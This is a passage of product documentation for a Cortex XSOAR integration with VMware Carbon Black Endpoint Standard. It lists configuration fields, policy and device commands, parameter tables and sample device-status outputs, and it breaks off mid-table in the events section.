<!-- HTML_DOC -->
<h2>Overview</h2>
<hr>
<p>Use the VMware Carbon Black Endpoint Standard integration to manage Carbon Black policies, devices and processes on Cortex XSOAR.</p>
<h2>Use cases</h2>
<hr>
<ul>
<li>Get information about events, policies, devices, and processes on Carbon Black.</li>
<li>Update events, policies, devices, and processes on Carbon Black.</li>
<li>Delete rules from policies.</li>
<li>Create new policies.</li>
</ul>
<h2>Configure VMware Carbon Black Endpoint Standard on Cortex XSOAR</h2>
<hr>
<ol>
<li>Navigate to <strong>Settings </strong>&gt; <strong>Integrations </strong>&gt; <strong>Servers &amp; Services.</strong>
</li>
<li>Search for VMware Carbon Black Endpoint Standard.</li>
<li>Click <strong>Add instance</strong> to create and configure a new integration.<br>
<ul>
<li>
<strong>Name</strong>: a textual name for the integration instance.</li>
<li>
<strong>Server URL</strong> (example: https://192.168.0.1)</li>
<li><strong>API Key</strong></li>
<li><strong>API Version</strong></li>
<li><strong>Connector ID</strong></li>
<li><strong>Fetch incidents</strong></li>
<li><strong>Incident type</strong></li>
<li>
<strong>SIEM key:</strong> Use to fetch incidents.</li>
<li>
<strong>SIEM Connector ID:</strong> Use to fetch incidents.</li>
<li>
<strong>Do not validate server certificate</strong> (not secure)</li>
<li><strong>Use system proxy settings</strong></li>
</ul>
</li>
<li>Click <strong>Test</strong> to validate the URLs, token, and connection.</li>
</ol>
<h2>Commands</h2>
<hr>
<ol>
<li><a href="#h_84519080251529924378905">Get the status of multiple devices: cbd-get-devices-status</a></li>
<li><a href="#h_595640721761529924385541">Get the status of a specified device: cbd-get-device-status</a></li>
<li><a href="#h_7324529601461529924395118">Change the security policy assigned to a device: cbd-change-device-status</a></li>
<li><a href="#h_7333034142151529924404230">Get multiple events: cbd-find-events</a></li>
<li><a href="#h_9672007832831529924411931">Get a specified event: cbd-find-event</a></li>
<li><a href="#h_7036892073501529924420376">Get multiple processes: cbd-find-processes</a></li>
<li><a href="#h_4112923114161529924434289">Get alert details: cbd-get-alert-details</a></li>
<li><a href="#h_1829682194811529924442623">Get all policy details: cbd-get-policies</a></li>
<li><a href="#h_8669376925451529924450795">Get the details of a specified policy: cbd-get-policy</a></li>
<li><a href="#h_1295394126081529924459791">Create a policy: cbd-create-policy</a></li>
<li><a href="#h_3776007306701529924469385">Update a policy: cbd-update-policy</a></li>
<li><a href="#h_4748523067311529924479097">Delete a policy: cbd-delete-policy</a></li>
<li><a href="#h_9448239097911529924489528">Add a rule to a policy: cbd-add-rule-to-policy</a></li>
<li><a href="#h_6282196488501529924499356">Delete a rule from a policy: cbd-delete-rule-from-policy</a></li>
<li><a href="#h_9510068399081529924508893">Update a rule in a policy: cbd-update-rule-in-policy</a></li>
<li><a href="#h_936553829651529924519312">Set a policy: cbd-set-policy</a></li>
</ol>
<h3 id="h_84519080251529924378905">Get the status of multiple devices</h3>
<hr>
<p>Retrieves the status of multiple devices, as specified by further input.</p>
<h5>Base Command</h5>
<p><code>cbd-get-devices-status</code></p>
<h5>Input</h5>
<table style="height: 102px; width: 750px;" border="2" cellpadding="6">
<tbody>
<tr>
<td style="width: 161px;"><strong>Parameter</strong></td>
<td style="width: 542px;"><strong>Description</strong></td>
<td style="width: 542px;"><strong>More Information</strong></td>
</tr>
<tr>
<td style="width: 161px;">hostName</td>
<td style="width: 542px;">
<p>Host name of the device to search for.</p>
</td>
<td style="width: 542px;">
<p>Case insensitive</p>
</td>
</tr>
<tr>
<td style="width: 161px;">hostNameExact</td>
<td style="width: 542px;">Exact host name of device to search for</td>
<td style="width: 542px;">Case sensitive</td>
</tr>
<tr>
<td style="width: 161px;">ownerName</td>
<td style="width: 542px;">
<p>Device owner name</p>
</td>
<td style="width: 542px;">
<p>Case insensitive</p>
</td>
</tr>
<tr>
<td style="width: 161px;">ownerNameExact</td>
<td style="width: 542px;">Exact device owner name</td>
<td style="width: 542px;">Case sensitive</td>
</tr>
<tr>
<td style="width: 161px;">ipAddress</td>
<td style="width: 542px;">External or internal IP address of the device to search for</td>
<td style="width: 542px;">-</td>
</tr>
<tr>
<td style="width: 161px;">start</td>
<td style="width: 542px;">
<p>Shows result from this row and after</p>
</td>
<td style="width: 542px;">
<p>-</p>
</td>
</tr>
<tr>
<td style="width: 161px;">rows</td>
<td style="width: 542px;">
<p>Maximum number of rows of result.</p>
</td>
<td style="width: 542px;">
<p>This parameter can be limited on the Cb Defense server side</p>
</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Context Output</h5>
<table style="height: 182px;" border="2" width="750" cellpadding="6">
<tbody>
<tr>
<td style="width: 551px;"><strong> Path</strong></td>
<td style="width: 209px;"> <strong>Description</strong>
</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDevicesStatus.Results.ActivationCodeExpiryTime</td>
<td style="width: 209px;">Activation code expiry time</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDevicesStatus.Results.LastExternalIpAddress</td>
<td style="width: 209px;">Last external IP address</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDevicesStatus.Results.LastLocation</td>
<td style="width: 209px;">Last location</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDevicesStatus.Results.LastReportedTime</td>
<td style="width: 209px;">Last reported time</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDevicesStatus.Results.LastShutdownTime</td>
<td style="width: 209px;">Last shutdown time</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDevicesStatus.Results.OsVersion</td>
<td style="width: 209px;">Operating system version</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDevicesStatus.Results.PolicyId</td>
<td style="width: 209px;">Policy ID</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDevicesStatus.Results.RegisteredTime</td>
<td style="width: 209px;">Registered time</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDevicesStatus.Results.Status</td>
<td style="width: 209px;">Status</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDevicesStatus.Results.DeviceId</td>
<td style="width: 209px;">Device ID</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDevicesStatus.Results.DeviceOwnerId</td>
<td style="width: 209px;">Device owner ID</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDevicesStatus.Results.DeviceType Description</td>
<td style="width: 209px;">Device type</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDevicesStatus.Results.OrganizationId</td>
<td style="width: 209px;">Organization ID</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDevicesStatus.Results.SensorVersion</td>
<td style="width: 209px;">Sensor version</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDevicesStatus.Results.TargetPriorityType</td>
<td style="width: 209px;">Target priority type</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDevicesStatus.Results.Email</td>
<td style="width: 209px;">Email address</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDevicesStatus.Results.LastContact</td>
<td style="width: 209px;">Last contact</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDevicesStatus.Results.OrganizationName</td>
<td style="width: 209px;">Organization name</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDevicesStatus.Results.SensorStates</td>
<td style="width: 209px;">Sensor states</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDevicesStatus.Results.AvStatus</td>
<td style="width: 209px;">AV status</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDevicesStatus.Results.LastInternalIpAddress</td>
<td style="width: 209px;">Last internal IP address</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDevicesStatus.Results.Name</td>
<td style="width: 209px;">Name</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDevicesStatus.Results.PolicyName</td>
<td style="width: 209px;">Policy name</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDevicesStatus.Results.SensorOutOfDate</td>
<td style="width: 209px;">Sensor out-of-date</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDevicesStatus.Results.TestId</td>
<td style="width: 209px;">Test ID</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Command Example</h5>
<p><code>!cbd-get-devices-status rows="1"</code></p>
<h5>Context Example</h5>
<pre>CarbonBlackDefense:{} 1 item
GetDevicesStatus:{} 1 item
Results:{} 25 items
ActivationCodeExpiryTime:1524157210454
AvStatus:null
LastContact:1533646970617
LastLocation:OFFSITE
Name:cberninger-mac2
LastExternalIpAddress:67.143.208.113
TestId:-1
PolicyId:6525
OrganizationId:1105
RegisteredTime:1523552410489
TargetPriorityType:MEDIUM
DeviceType:MAC
DeviceId:844355
Status:REGISTERED
OsVersion:MAC OS X 10.10.5
LastReportedTime:1533642023089
DeviceOwnerId:278380
LastShutdownTime:1533587921518
SensorOutOfDate:false
LastInternalIpAddress:192.168.2.125
SensorStates:[] 5 items
0:ACTIVE
1:LIVE_RESPONSE_NOT_RUNNING
2:LIVE_RESPONSE_NOT_KILLED
3:LIVE_RESPONSE_DISABLED
4:SECURITY_CENTER_OPTLN_DISABLED
Email:cberninger
PolicyName:default
OrganizationName:cb-internal-alliances.com
SensorVersion:3.0.2.8
</pre>
<h5>Human Readable Output</h5>
<table style="width: 412px;" border="2" cellpadding="6">
<thead>
<tr>
<th style="width: 206px;">ActivationCodeExpiryTime</th>
<th style="width: 179px;">1524157210454</th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 206px;">AvStatus</td>
<td style="width: 179px;"> </td>
</tr>
<tr>
<td style="width: 206px;">DeviceId</td>
<td style="width: 179px;">844355</td>
</tr>
<tr>
<td style="width: 206px;">DeviceOwnerId</td>
<td style="width: 179px;">278380</td>
</tr>
<tr>
<td style="width: 206px;">DeviceType</td>
<td style="width: 179px;">MAC</td>
</tr>
<tr>
<td style="width: 206px;">Email</td>
<td style="width: 179px;">cberninger</td>
</tr>
<tr>
<td style="width: 206px;">LastContact</td>
<td style="width: 179px;">1533646970617</td>
</tr>
<tr>
<td style="width: 206px;">LastExternalIpAddress</td>
<td style="width: 179px;">67.143.208.113</td>
</tr>
<tr>
<td style="width: 206px;">LastInternalIpAddress</td>
<td style="width: 179px;">192.168.2.125</td>
</tr>
<tr>
<td style="width: 206px;">LastLocation</td>
<td style="width: 179px;">OFFSITE</td>
</tr>
<tr>
<td style="width: 206px;">LastReportedTime</td>
<td style="width: 179px;">1533642023089</td>
</tr>
<tr>
<td style="width: 206px;">LastShutdownTime</td>
<td style="width: 179px;">1533587921518</td>
</tr>
<tr>
<td style="width: 206px;">Name</td>
<td style="width: 179px;">cberninger-mac2</td>
</tr>
<tr>
<td style="width: 206px;">OrganizationId</td>
<td style="width: 179px;">1105</td>
</tr>
<tr>
<td style="width: 206px;">OrganizationName</td>
<td style="width: 179px;">cb-internal-alliances.com</td>
</tr>
<tr>
<td style="width: 206px;">OsVersion</td>
<td style="width: 179px;">MAC OS X 10.10.5</td>
</tr>
<tr>
<td style="width: 206px;">PolicyId</td>
<td style="width: 179px;">6525</td>
</tr>
<tr>
<td style="width: 206px;">PolicyName</td>
<td style="width: 179px;">default</td>
</tr>
<tr>
<td style="width: 206px;">RegisteredTime</td>
<td style="width: 179px;">1523552410489</td>
</tr>
<tr>
<td style="width: 206px;">SensorOutOfDate</td>
<td style="width: 179px;">false</td>
</tr>
</tbody>
</table>
<p> </p>
<h3 id="h_595640721761529924385541">Get the status of a specified device</h3>
<hr>
<p>Retrieves the status of a specified device.</p>
<h5>Base Code</h5>
<p><code>cbd-get-device-status</code></p>
<h5>Input</h5>
<table style="height: 102px; width: 750px;" border="2" cellpadding="6">
<tbody>
<tr>
<td style="width: 161px;"><strong>Parameter</strong></td>
<td style="width: 542px;"><strong>Description</strong></td>
</tr>
<tr>
<td style="width: 161px;">deviceId</td>
<td style="width: 542px;">
<p>Individual device ID</p>
</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Context Output</h5>
<table style="height: 182px;" border="2" width="750" cellpadding="6">
<tbody>
<tr>
<td style="width: 551px;"><strong> Path</strong></td>
<td style="width: 209px;"> <strong>Description</strong>
</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.TargetPriorityType</td>
<td style="width: 209px;">Target priority type</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.OrganizationId</td>
<td style="width: 209px;">Organization ID</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.CreateTime</td>
<td style="width: 209px;">Time of creation</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.DeviceId</td>
<td style="width: 209px;">Device ID</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.Email</td>
<td style="width: 209px;">Email address</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.LastInternalIpAddress</td>
<td style="width: 209px;">Last internal IP address</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.LastLocation</td>
<td style="width: 209px;">Last location</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.OsVersion</td>
<td style="width: 209px;">Operating system version</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.AvStatus</td>
<td style="width: 209px;">AV status</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.LastExternalIpAddress</td>
<td style="width: 209px;">Last external IP address</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.RegisteredTime</td>
<td style="width: 209px;">Time of registration</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.LastContact</td>
<td style="width: 209px;">Last contact</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.Status</td>
<td style="width: 209px;">Status</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.TestId</td>
<td style="width: 209px;">Test ID</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.PolicyId</td>
<td style="width: 209px;">Policy ID</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.UpdateVersion</td>
<td style="width: 209px;">Update version</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.OrganizationName</td>
<td style="width: 209px;">Organization name</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.RootedByAnalytics</td>
<td style="width: 209px;">Rooted ByAnalytics</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.SensorVersion</td>
<td style="width: 209px;">Sensor version</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.DeviceType</td>
<td style="width: 209px;">Device type</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.PolicyName</td>
<td style="width: 209px;">Policy name</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.RootedByAnalyticsTime</td>
<td style="width: 209px;">Rooted ByAnalytics Time</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.SensorOutOfDate</td>
<td style="width: 209px;">Sensor out-of-date</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.SensorStates</td>
<td style="width: 209px;">Sensor states</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.Name</td>
<td style="width: 209px;">Name</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.Id</td>
<td style="width: 209px;">ID</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.LastReportedTime</td>
<td style="width: 209px;">Last reported time</td>
</tr>
<tr>
<td style="width: 551px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.DeviceOwnerId</td>
<td style="width: 209px;">Device owner ID</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Command Example</h5>
<p><code>!cbd-get-device-status deviceId="844355"</code></p>
<h5>Context Example</h5>
<pre>CarbonBlackDefense:{} 1 item
GetDeviceStatus:{} 1 item
DeviceInfo:{} 25 items
ActivationCodeExpiryTime:null
AvStatus:null
LastContact:1533648166041
LastLocation:OFFSITE
Name:cberninger-mac2
LastExternalIpAddress:67.143.208.113
TestId:-1
PolicyId:6525
OrganizationId:1105
RegisteredTime:1523552410489
TargetPriorityType:MEDIUM
DeviceType:MAC
DeviceId:844355
Status:REGISTERED
OsVersion:MAC OS X 10.10.5
LastReportedTime:1533642023089
DeviceOwnerId:278380
LastShutdownTime:1533587921518
SensorOutOfDate:false
LastInternalIpAddress:192.168.2.125
SensorStates:[] 5 items
0:ACTIVE
1:LIVE_RESPONSE_NOT_RUNNING
2:LIVE_RESPONSE_NOT_KILLED
3:LIVE_RESPONSE_DISABLED
4:SECURITY_CENTER_OPTLN_DISABLED
Email:cberninger
PolicyName:default
OrganizationName:cb-internal-alliances.com
SensorVersion:3.0.2.8
</pre>
<h5>Human Readable Output</h5>
<table style="width: 412px;" border="2" cellpadding="6">
<thead>
<tr>
<th style="width: 202px;">ActivationCodeExpiryTime</th>
<th style="width: 183px;"> </th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 202px;">AvStatus</td>
<td style="width: 183px;"> </td>
</tr>
<tr>
<td style="width: 202px;">DeviceId</td>
<td style="width: 183px;">844355</td>
</tr>
<tr>
<td style="width: 202px;">DeviceOwnerId</td>
<td style="width: 183px;">278380</td>
</tr>
<tr>
<td style="width: 202px;">DeviceType</td>
<td style="width: 183px;">MAC</td>
</tr>
<tr>
<td style="width: 202px;">Email</td>
<td style="width: 183px;">cberninger</td>
</tr>
<tr>
<td style="width: 202px;">LastContact</td>
<td style="width: 183px;">1533648166041</td>
</tr>
<tr>
<td style="width: 202px;">LastExternalIpAddress</td>
<td style="width: 183px;">67.143.208.113</td>
</tr>
<tr>
<td style="width: 202px;">LastInternalIpAddress</td>
<td style="width: 183px;">192.168.2.125</td>
</tr>
<tr>
<td style="width: 202px;">LastLocation</td>
<td style="width: 183px;">OFFSITE</td>
</tr>
<tr>
<td style="width: 202px;">LastReportedTime</td>
<td style="width: 183px;">1533642023089</td>
</tr>
<tr>
<td style="width: 202px;">LastShutdownTime</td>
<td style="width: 183px;">1533587921518</td>
</tr>
<tr>
<td style="width: 202px;">Name</td>
<td style="width: 183px;">cberninger-mac2</td>
</tr>
<tr>
<td style="width: 202px;">OrganizationId</td>
<td style="width: 183px;">1105</td>
</tr>
<tr>
<td style="width: 202px;">OrganizationName</td>
<td style="width: 183px;">cb-internal-alliances.com</td>
</tr>
<tr>
<td style="width: 202px;">OsVersion</td>
<td style="width: 183px;">MAC OS X 10.10.5</td>
</tr>
<tr>
<td style="width: 202px;">PolicyId</td>
<td style="width: 183px;">6525</td>
</tr>
<tr>
<td style="width: 202px;">PolicyName</td>
<td style="width: 183px;">default</td>
</tr>
<tr>
<td style="width: 202px;">RegisteredTime</td>
<td style="width: 183px;">1523552410489</td>
</tr>
<tr>
<td style="width: 202px;">SensorOutOfDate</td>
<td style="width: 183px;">false</td>
</tr>
</tbody>
</table>
<p> </p>
<h3 id="h_7324529601461529924395118">Change the security policy assigned to a device</h3>
<hr>
<p>Changes the security policy assigned to a specified device.</p>
<h5>Base Command</h5>
<p><code>cbd-change-device-status</code></p>
<h5>Input</h5>
<table style="width: 748px;" border="2" cellpadding="6">
<tbody>
<tr>
<td style="width: 142px;"><strong>Parameter</strong></td>
<td style="width: 561px;"><strong>Description</strong></td>
</tr>
<tr>
<td style="width: 142px;">deviceId</td>
<td style="width: 561px;">
<p>The device ID</p>
</td>
</tr>
<tr>
<td style="width: 142px;">policyId</td>
<td style="width: 561px;">
<p>The policy ID</p>
</td>
</tr>
<tr>
<td style="width: 142px;">policyName</td>
<td style="width: 561px;">
<p>The policy name</p>
</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Context Output</h5>
<table style="width: 748px;" border="2" cellpadding="6">
<thead>
<tr>
<th class="wysiwyg-text-align-left" style="width: 536px;"><strong>Path</strong></th>
<th class="wysiwyg-text-align-left" style="width: 185px;"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 536px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.TargetPriorityType</td>
<td style="width: 185px;">Target priority type</td>
</tr>
<tr>
<td style="width: 536px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.OrganizationId</td>
<td style="width: 185px;">Organization ID</td>
</tr>
<tr>
<td style="width: 536px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.CreateTime</td>
<td style="width: 185px;">Time of creation</td>
</tr>
<tr>
<td style="width: 536px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.DeviceId</td>
<td style="width: 185px;">Device ID</td>
</tr>
<tr>
<td style="width: 536px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.Email</td>
<td style="width: 185px;">Email address</td>
</tr>
<tr>
<td style="width: 536px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.LastInternalIpAddress</td>
<td style="width: 185px;">Last internal IP address</td>
</tr>
<tr>
<td style="width: 536px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.LastLocation</td>
<td style="width: 185px;">Last location</td>
</tr>
<tr>
<td style="width: 536px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.OsVersion</td>
<td style="width: 185px;">Operating system version</td>
</tr>
<tr>
<td style="width: 536px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.AvStatus</td>
<td style="width: 185px;">Anti-virus status</td>
</tr>
<tr>
<td style="width: 536px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.LastExternalIpAddress</td>
<td style="width: 185px;">Last external IP address</td>
</tr>
<tr>
<td style="width: 536px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.RegisteredTime</td>
<td style="width: 185px;">Registration time</td>
</tr>
<tr>
<td style="width: 536px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.LastContact</td>
<td style="width: 185px;">Last contact</td>
</tr>
<tr>
<td style="width: 536px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.Status</td>
<td style="width: 185px;">Status</td>
</tr>
<tr>
<td style="width: 536px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.TestId</td>
<td style="width: 185px;">Test ID</td>
</tr>
<tr>
<td style="width: 536px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.PolicyId</td>
<td style="width: 185px;">Policy ID</td>
</tr>
<tr>
<td style="width: 536px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.UpdateVersion</td>
<td style="width: 185px;">Update version</td>
</tr>
<tr>
<td style="width: 536px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.OrganizationName</td>
<td style="width: 185px;">Organization name</td>
</tr>
<tr>
<td style="width: 536px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.RootedByAnalytics</td>
<td style="width: 185px;">Rooted ByAnalytics</td>
</tr>
<tr>
<td style="width: 536px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.SensorVersion</td>
<td style="width: 185px;">Sensor version</td>
</tr>
<tr>
<td style="width: 536px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.DeviceType</td>
<td style="width: 185px;">Device type</td>
</tr>
<tr>
<td style="width: 536px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.PolicyName</td>
<td style="width: 185px;">Policy name</td>
</tr>
<tr>
<td style="width: 536px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.RootedByAnalyticsTime</td>
<td style="width: 185px;">Rooted ByAnalytics time</td>
</tr>
<tr>
<td style="width: 536px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.SensorOutOfDate</td>
<td style="width: 185px;">Sensor out-of-date date</td>
</tr>
<tr>
<td style="width: 536px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.SensorStates</td>
<td style="width: 185px;">Sensor states</td>
</tr>
<tr>
<td style="width: 536px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.Name</td>
<td style="width: 185px;">Name</td>
</tr>
<tr>
<td style="width: 536px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.Id</td>
<td style="width: 185px;">ID</td>
</tr>
<tr>
<td style="width: 536px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.LastReportedTime</td>
<td style="width: 185px;">Time of last report</td>
</tr>
<tr>
<td style="width: 536px;">CarbonBlackDefense.GetDeviceStatus.DeviceInfo.DeviceOwnerId</td>
<td style="width: 185px;">Device owner ID</td>
</tr>
</tbody>
</table>
<h5> </h5>
<h5>Command Example</h5>
<p><code>!cbd-change-device-status deviceId="844355" policyName="default"</code></p>
<h5>Context Example</h5>
<pre>CarbonBlackDefense:{} 1 item
ChangeDeviceStatus:{} 1 item
DeviceInfo:{} 24 items
AvStatus:null
LastContact:1533648445513
LastLocation:OFFSITE
Name:cberninger-mac2
LastExternalIpAddress:67.143.208.113
TestId:-1
PolicyId:6525
OrganizationId:1105
RegisteredTime:1523552410489
TargetPriorityType:MEDIUM
DeviceType:MAC
DeviceId:844355
Status:REGISTERED
OsVersion:MAC OS X 10.10.5
LastReportedTime:1533642023089
DeviceOwnerId:278380
LastShutdownTime:1533587921518
SensorOutOfDate:false
LastInternalIpAddress:192.168.2.125
SensorStates:[] 5 items
0:ACTIVE
1:LIVE_RESPONSE_NOT_RUNNING
2:LIVE_RESPONSE_NOT_KILLED
3:LIVE_RESPONSE_DISABLED
4:SECURITY_CENTER_OPTLN_DISABLED
Email:cberninger
PolicyName:default
OrganizationName:cb-internal-alliances.com
SensorVersion:3.0.2.8
</pre>
<h5>Human Readable Output</h5>
<table style="width: 1179px;" border="2" cellpadding="6">
<thead>
<tr>
<th style="width: 151px;">AvStatus</th>
<th style="width: 1001px;"> </th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 151px;">DeviceId</td>
<td style="width: 1001px;">844355</td>
</tr>
<tr>
<td style="width: 151px;">DeviceOwnerId</td>
<td style="width: 1001px;">278380</td>
</tr>
<tr>
<td style="width: 151px;">DeviceType</td>
<td style="width: 1001px;">MAC</td>
</tr>
<tr>
<td style="width: 151px;">Email</td>
<td style="width: 1001px;">cberninger</td>
</tr>
<tr>
<td style="width: 151px;">LastContact</td>
<td style="width: 1001px;">1533648445513</td>
</tr>
<tr>
<td style="width: 151px;">LastExternalIpAddress</td>
<td style="width: 1001px;">67.143.208.113</td>
</tr>
<tr>
<td style="width: 151px;">LastInternalIpAddress</td>
<td style="width: 1001px;">192.168.2.125</td>
</tr>
<tr>
<td style="width: 151px;">LastLocation</td>
<td style="width: 1001px;">OFFSITE</td>
</tr>
<tr>
<td style="width: 151px;">LastReportedTime</td>
<td style="width: 1001px;">1533642023089</td>
</tr>
<tr>
<td style="width: 151px;">LastShutdownTime</td>
<td style="width: 1001px;">1533587921518</td>
</tr>
<tr>
<td style="width: 151px;">Name</td>
<td style="width: 1001px;">cberninger-mac2</td>
</tr>
<tr>
<td style="width: 151px;">OrganizationId</td>
<td style="width: 1001px;">1105</td>
</tr>
<tr>
<td style="width: 151px;">OrganizationName</td>
<td style="width: 1001px;">cb-internal-alliances.com</td>
</tr>
<tr>
<td style="width: 151px;">OsVersion</td>
<td style="width: 1001px;">MAC OS X 10.10.5</td>
</tr>
<tr>
<td style="width: 151px;">PolicyId</td>
<td style="width: 1001px;">6525</td>
</tr>
<tr>
<td style="width: 151px;">PolicyName</td>
<td style="width: 1001px;">default</td>
</tr>
<tr>
<td style="width: 151px;">RegisteredTime</td>
<td style="width: 1001px;">1523552410489</td>
</tr>
<tr>
<td style="width: 151px;">SensorOutOfDate</td>
<td style="width: 1001px;">false</td>
</tr>
<tr>
<td style="width: 151px;">SensorStates</td>
<td style="width: 1001px;">ACTIVE,LIVE_RESPONSE_NOT_RUNNING,LIVE_RESPONSE_NOT_KILLED,LIVE_RESPONSE_DISABLED,SECURITY_CENTER_OPTLN_DISABLED</td>
</tr>
</tbody>
</table>
<p> </p>
<h3 id="h_7333034142151529924404230">Get multiple events</h3>
<hr>
<p>Returns multiple event details, as specified by further input.</p>
<h5>Base Command</h5>
<p><code>cbd-find-events</code></p>
<h5>Input</h5>
<table style="height: 102px; width: 750px;" border="2" cellpadding="6">
<tbody>
<tr>
<td style="width: 161px;"><strong>Parameter</strong></td>
<td style="width: 542px;"><strong>Description</strong></td>
<td style="width: 542px;"><strong>More Information</strong></td>
</tr>
<tr>
<td style="width: 161px;">hostName</td>
<td style="width: 542px;">
<p>The host name of the event to search for</p>
</td>
<td style="width: 542px;">
<p>Case <strong>in</strong>sensitive.</p>
</td>
</tr>
<tr>
<td style="width: 161px;">hostNameExact</td>
<td style="width: 542px;">The exact host name of the event to find</td>
